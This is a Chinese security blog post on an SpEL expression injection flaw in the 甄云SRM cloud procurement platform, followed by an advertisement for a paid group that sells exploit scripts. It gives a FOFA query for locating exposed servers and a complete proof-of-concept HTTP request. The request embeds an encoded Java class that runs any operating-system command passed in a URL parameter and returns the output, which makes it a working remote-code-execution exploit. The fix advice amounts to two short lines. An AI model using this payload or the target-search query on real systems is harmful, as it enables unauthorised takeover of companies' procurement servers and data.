#  甄云SRM云平台 SpEL表达式注入漏洞(XVE-2024-18301)   
冷漠安全  冷漠安全   2024-10-23 21:23  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
甄云SRM云平台是由上海甄云信息科技有限公司开发的一款专为企业采购数字化转型而设计的云平台。该产品以企业采购管理为核心，通过数字化手段提升采购效率，降低采购成本，增强供应链的透明度和合规性。致力于为企业提供从需求到寻源、订单到对账开票的全采购流程管理，全面覆盖企业全品类采购。该平台不仅适用于中大型企业，也专为中小企业设计了SaaS产品，满足不同规模企业的采购管理需求。  
  
0x03  
  
**漏洞威胁**  
  
甄云SRM平台存在SpEL表达式注入漏洞，该漏洞源于系统能够解析/oauth/public/后路径中的SpEL表达式，导致攻击者能够利用该漏洞执行任意代码。  
  
0x04  
  
**漏洞环境**  
  
FOFA:   
```
body="/oauth/static/default/css/footer.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pWG6L0mxswDQRaNsVK1SzEJP27kSAvSq6INNr5GseKqsIZXnXvH4ury3jLubf2yNXrYzSrnFw8jA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /oauth/public/%5f%5f%24%7bT(groovy.lang.GroovyClassLoader).newInstance().defineClass('CALC',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADQAqwoAJABOCgBPAFAHAFEKAAMAUgoAAwBTCwBUAFUIAD8LAFYAVwcAWAoAWQBaCgBbAFwKAAkAXQgAXgoAXwBgCgAJAGEIAGIKAAkAYwgAZAgAZQgAZggAZwoAaABpCgBoAGoKAGsAbAcAbQoAGQBuCABvCgAZAHAKABkAcQoAGQByCABzCgB0AHUKAHQAdgoAdAB3BwB4BwB5AQAGPGluaXQ%2bAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAAR0aGlzAQAGTENBTEM7AQACc3IBAEJMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlczsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQALcHJpbnRXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAh1c2VybmFtZQEADVN0YWNrTWFwVGFibGUHAHgHAFEHAHoHAHsHAHwHAFgHAC8HAH0HAG0BAApFeGNlcHRpb25zBwB%2bAQAKU291cmNlRmlsZQEACUNBTEMuamF2YQwAJQAmBwBxxxxDACAAIEBAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzDACCAIMMAIQAhQcAewwAhgCHBwB6DACIAIkBABBqYXZhL2xhbmcvU3RyaW5nBwCKDACLAI4HAI8MAJAAkQwAJQCSAQAHb3MubmFtZQcAkwwAlACJDACVAJYBAAN3aW4MAJcAmAEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJkMAJoAmwwAnACdBwCeDACfAKABABFqYXZhL3V0aWwvU2Nhbm5lcgwAJQChAQACXGEMAKIAowwApAClDACmAJYBAAAHAHwMAKcAqAwAqQAmDACqACYBAARDQUxDAQAQamF2YS9sYW5nL09iamVjdAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFKFtCKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UAIQAjACQAAAAAAAEAAQAlACYAAgAnAAACGAAEAAwAAADZKrcAAbgAAsAAA0wrtgAETSu2AAVOLbkABgEAOgQsEge5AAgCADoFGQXGAKW7AAlZuAAKGQW2AAu3AAw6BQQ2BhINuAAOOgcZB8YAExkHtgAPEhC2ABGZAAYDNgYVBpkAGQa9AAlZAxISU1kEEhNTWQUZBVOnABYGvQAJWQMSFFNZBBIVU1kFGQVTOgi4ABYZCLYAF7YAGDoJuwAZWRkJtwAaEhu2ABw6ChkKtgAdmQALGQq2AB6nAAUSHzoLGQQZC7YAIBkEtgAhGQS2ACIZBLYAIRkEtgAisQAAAAMAKAAAAFoAFgAAAAwABAAOAAsADwAQABAAFQARAB0AEwAnABQALAAWAD0AGABAABkARwAaAFkAGwBcAB4AjAAfAJkAIACpACEAvQAiAMQAIwDJACQAzgAnANMAKADYACkAKQAAAHoADABAAI4AKgArAAYARwCHACwALQAHAIwAQgAuAC8ACACZADUAMAAxAAkAqQAlADIAMwAKAL0AEQA0AC0ACwAAANkANQA2AAAACwDOADcAOAABABAAyQA5ADoAAgAVAMQAOwA8AAMAHQC8AD0APgAEACcAsgAxxxxAC0ABQBAAAAATQAGxxxxwBcAAgHAEEHAEIHAEMHAEQHAEUHAEYBBwBGAAAaUgcARxxxx4ALgcARwcASAcASUEHAEbxxxxABIABgcAQQcAQgcAQwcARAcARQcARgAAAEoAAAAEAAEASwACAEwAAAACAE0AjQAAAAoAAQBbAFkAjAAJ'.replace('xxxx',new%20String(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('Lw=='))))).newInstance()-1%7d%5f%5f%3a%3a%78/ab?username=aWQ= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pWG6L0mxswDQRaNsVK1SzEYvVgBF8bhDibBl2iateVXRhrewjWFu1f0xxtunjSKhOS4NZwvdLSmAzQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pWG6L0mxswDQRaNsVK1SzEnJiaiasrJ6PXlWLhTfpFkThBlbibFrtcq1VNF1pWMmJibRx5AfmlJV1mng/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pWG6L0mxswDQRaNsVK1SzEIuXv2GMXW0qibtMEM9ia7J9sj83TyWAjYd6kib4vgU3qtCyp9zwNIcYKw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pWG6L0mxswDQRaNsVK1SzEanzpYUU2HKyCqICNkSK6f8Ws8SdAaowMNO0ytmicktARVAHwsBprtMw/640?wx_fmt=gif&from=appmsg "")  
  
  
